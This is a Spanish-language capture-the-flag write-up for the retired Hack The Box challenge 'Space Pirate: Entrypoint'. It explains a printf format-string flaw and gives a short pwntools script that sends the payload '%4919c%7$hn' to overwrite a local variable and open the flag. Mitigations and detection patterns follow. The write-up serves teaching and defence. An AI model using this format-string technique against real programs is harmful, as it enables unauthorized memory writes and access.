---
challenge: "Space Pirate: Entrypoint"
category: Challenge
type: pwn
os: Linux
difficulty: Very Easy
platform: Hack The Box
state: Retired
tags: [pwn, format-string, printf, variable-local, x86-64, pwntools]
---

# Space Pirate: Entrypoint — Hack The Box (Challenge)

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired por evidencia de writeups públicos; no comprobado con sesión en HTB.
> Sin flags ni cadenas reales: solo metodología.

## TL;DR

La opción 1 lee el «número de serie» y lo pasa directamente a `printf`, así que es una **format string**. La variable que decide el acceso vale `0xdeadbeef` y se compara con `0xdead1337`: con `%7$hn` se escriben los dos bytes bajos y la puerta se abre. No hay que tocar el retorno ni el canario.

## Enunciado y superficie

- Categoría **Pwn**, dificultad **Very Easy**, binario ELF x86-64 y una instancia remota.
- El enunciado plantea un sistema de autenticación con dos opciones: escanear una tarjeta o introducir una contraseña.
- La opción 2 compara 15 bytes con una contraseña de 33: es un callejón sin salida a propósito.

```bash
file sp_entrypoint
checksec --file=sp_entrypoint
```

```text
RELRO:    Full RELRO
Stack:    Canary found
NX:       NX enabled
PIE:      PIE enabled
```

Las protecciones están todas activas, pero el fallo no necesita escribir en el retorno.

## Reconocimiento

```text
 1. Scan card 💳
 2. Insert password
 >
```

Con `1` pide el serial y responde `Your card is: <lo que hayas escrito>`. Ese eco es la pista: el programa está usando la entrada como **formato**, no como dato.

```text
Insert card's serial number: %lx.%lx.%lx.%lx.%lx.%lx
Your card is: 7ffed66b4cf0.7f61975088c0.0.f.0.deadbeef
```

El sexto valor es exactamente `deadbeef`: ahí vive la variable que interesa.

## Análisis del código

La función `main` deja dos variables locales relevantes:

```c
local_48 = 0xdeadbeef;
local_40 = &local_48;
...
read(0, local_38, 0x1f);
printf("\nYour card is: ");
printf(local_38);          // format string

if (local_48 == 0xdead1337)
    open_door();           // system("cat flag*")
```

- `local_38` es un búfer de 40 bytes que recibe hasta 31 bytes: no hay desbordamiento.
- `local_48` vale `0xdeadbeef` y la comparación exige `0xdead1337`; solo cambian los dos bytes bajos.
- `local_40` guarda la dirección de `local_48`, y es la que aparece en la pila en la posición 7.

`open_door()` imprime la frase y ejecuta `cat flag*`; el objetivo es llegar ahí sin credenciales.

## Explicación del fallo

`printf` interpreta la entrada del usuario. Con `%lx` se leen argumentos que no se pasaron (valores de la pila) y con `%n` se **escribe** el número de caracteres impresos en la dirección indicada.

```text
posición 6: 0xdeadbeef        (valor de local_48)
posición 7: dirección de local_48
```

`%7$hn` escribe un `unsigned short` (2 bytes) en la dirección de la posición 7. Si antes se han impreso `0x1337` caracteres, el valor queda `0xdead1337`. Como el resto de la variable no cambia, la comparación se cumple.

`%4919c` imprime 4919 caracteres (0x1337) y `%7$hn` los cuenta; no hace falta escribir la dirección a mano porque ya está en la pila.

## Reproducción local

```bash
./sp_entrypoint
# opción 1, serial: %6$lx     -> deadbeef
# opción 1, serial: %4919c%7$hn
```

Para ver la dirección con GDB:

```gdb
gef> grep 0xdeadbeef
# [stack] 0x7fffffffe650
```

Y volver a enumerar la pila con `%lx.` repetido: en la posición 7 aparece `0x7fffffffe650`.

## Explotación

```python
#!/usr/bin/env python3
from pwn import *

HOST, PORT = '<IP>', <PORT>
p = remote(HOST, PORT)

p.sendlineafter(b'> ', b'1')
p.sendlineafter(b': ', b'%4919c%7$hn')
print(p.recvall(timeout=5).decode(errors='replace'))
```

- El payload no lleva dirección: `%7$hn` usa el puntero que ya está en la pila.
- `%4919c` debe ir **antes** de `%7$hn`; el orden decide el valor escrito.
- Si el binario cambiara de build, hay que volver a localizar la posición de `local_48`; el 6 y el 7 no son universales.
- La alineación o el tamaño del búfer no afectan: no se escribe fuera de la variable.

La prueba de ejecución es el mensaje de `open_door()` seguido del contenido de la flag.

## Evidencia

- `checksec` con Full RELRO, canario, NX y PIE.
- `%6$lx` devolviendo `deadbeef` y `%7$lx` devolviendo la dirección de la variable.
- Salida local de `open_door()` con una flag de prueba, nunca la real.

## Lecciones aprendidas

- Un `printf` con entrada de usuario es escritura arbitraria, aunque el búfer esté bien dimensionado.
- Las protecciones de memoria no cubren fallos de formato: PIE y canario siguen activos y el ataque funciona.
- `%n` escribe el contador acumulado; `%hn` limita a 2 bytes y evita tener que imprimir 32 bits.
- El índice (`$`) depende del build y de la pila; se confirma leyendo con `%lx`, no se adivina.
- La opción «imposible» (contraseña de 33 bytes en un `read` de 15) es una distracción: el camino es la otra.

## Mitigaciones y detección

- `printf("%s", buf)` en lugar de `printf(buf)`; nunca pasar entrada de usuario como formato.
- Compilar con `-Wformat -Wformat-security` y `_FORTIFY_SOURCE=2`; detecta el patrón en revisión.
- Deshabilitar `%n` en el entorno cuando sea posible (glibc lo restringe con `FORTIFY_SOURCE` en algunos casos).
- Detección: peticiones con `%n`, `%hn`, `%s` o cadenas de `%lx` repetidas; procesos que mueren con SIGSEGV tras una entrada con `%`.
- Referencias: CWE-134 (uncontrolled format string), MITRE T1190.

## Referencias

- <https://7rocky.github.io/en/ctf/htb-challenges/pwn/space-pirate-entrypoint/>
- <https://cwe.mitre.org/data/definitions/134.html>
- <https://man7.org/linux/man-pages/man3/printf.3.html>
- <https://docs.pwntools.com/en/stable/tubes.html>
